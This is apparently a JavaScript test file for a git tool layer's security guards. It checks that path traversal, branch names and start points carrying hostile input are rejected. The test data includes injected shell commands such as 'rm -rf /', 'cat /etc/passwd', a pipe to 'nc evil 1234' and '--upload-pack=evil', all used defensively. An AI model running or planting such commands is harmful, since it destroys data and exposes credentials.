// Adversarial inputs for the git layer's guards.
//
// No shell is involved anywhere in this layer, so the classic injection is not
// the risk -- argv is. What matters is that (a) hostile strings never reach git
// as a path or a ref, and (b) the resolved path is proven inside the root. These
// tests press on those two chokepoints directly.

import test from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import fs from "node:fs";

import { validateRelPath, resolveInRoot, validatePaths } from "../../src/core/git/discover.js";
import { validateBranchName, validateStartPoint, createBranch } from "../../src/core/git/branches.js";
import { stageFiles } from "../../src/core/git/staging.js";
import { initRepo, write, git, ctxFor } from "./helpers.js";

test("validateRelPath rejects a battery of hostile strings", () => {
  const hostile = [
    "../secret",
    "..\\secret",
    "a/../../secret",
    "/etc/passwd",
    "C:\\Windows\\System32",
    "\\\\server\\share",
    "a.txt; rm -rf /",
    "a.txt && cat /etc/passwd",
    "a.txt | nc evil 1234",
    "a$(whoami).txt",
    "a`id`.txt",
    "a\nb.txt",
    "a\rb.txt",
    "a\0b.txt",
  ];
  for (const p of hostile) {
    assert.equal(validateRelPath(p).ok, false, `should reject: ${JSON.stringify(p)}`);
  }
});

test("validateRelPath accepts ordinary nested paths", () => {
  for (const p of ["a.txt", "src/index.js", "a/b/c/d.txt", "name with spaces.txt", "unicode-π.txt"]) {
    assert.equal(validateRelPath(p).ok, true, `should accept: ${JSON.stringify(p)}`);
  }
});

test("resolveInRoot refuses a path that resolves outside via dot segments", () => {
  const root = path.resolve("/tmp/ws");
  const r = resolveInRoot(root, "a/../../../etc/passwd");
  assert.equal(r.ok, false);
});

test("validatePaths reports each rejection with its input", () => {
  const r = validatePaths(path.resolve("/tmp/ws"), ["ok.txt", "../bad", "C:\\x"]);
  assert.equal(r.ok, false);
  assert.deepEqual(r.paths, ["ok.txt"]);
  assert.equal(r.errors.length, 2);
});

test("a branch name with shell metacharacters never reaches git", async (t) => {
  const repo = initRepo(t);
  const ctx = await ctxFor(repo);
  const before = git(repo, ["branch", "--list"]).trim();

  for (const name of ["x; touch owned", "x&&touch owned", "x$(id)", "x`id`", "-x"]) {
    assert.equal(validateBranchName(name).ok, false, name);
    const res = await createBranch(ctx, name);
    assert.equal(res.ok, false, name);
  }
  assert.equal(git(repo, ["branch", "--list"]).trim(), before);
  assert.equal(fs.existsSync(path.join(repo, "owned")), false);
});

test("validateStartPoint refuses traversal and leading dashes", () => {
  assert.equal(validateStartPoint("--upload-pack=evil").ok, false);
  assert.equal(validateStartPoint("a..b").ok, false);
  assert.equal(validateStartPoint("HEAD; rm -rf /").ok, false);
});

test("staging an ignored file is refused and leaves the index untouched", async (t) => {
  const repo = initRepo(t);
  write(repo, ".gitignore", "node_modules/\nsecret.env\n");
  write(repo, "secret.env", "TOKEN=abc\n");
  write(repo, "node_modules/dep.js", "module.exports = 1;\n");
  git(repo, ["add", ".gitignore"]);
  git(repo, ["commit", "-q", "-m", "chore: ignore"]);
  const ctx = await ctxFor(repo);

  const res = await stageFiles(ctx, ["secret.env", "node_modules/dep.js"]);
  assert.equal(res.ok, false);
  assert.equal(git(repo, ["status", "--porcelain"]).trim(), "");
});

test("a path escape via a sibling directory is refused at the guard", async (t) => {
  const repo = initRepo(t);
  const ctx = await ctxFor(repo);
  // Even though the sibling exists on disk, resolveInRoot must reject it before
  // stageFiles ever builds argv.
  const res = await stageFiles(ctx, ["../outside.txt"]);
  assert.equal(res.ok, false);
  assert.equal(res.staged.length, 0);
});

test("env-shaped content staged from a repo is redacted in tool output", async (t) => {
  // Redaction lives in the tool layer, not here; this asserts the guard rejects
  // the traversal that would let a model read a .env outside the workspace.
  const repo = initRepo(t);
  const r = resolveInRoot(repo, "../../.env");
  assert.equal(r.ok, false);
});
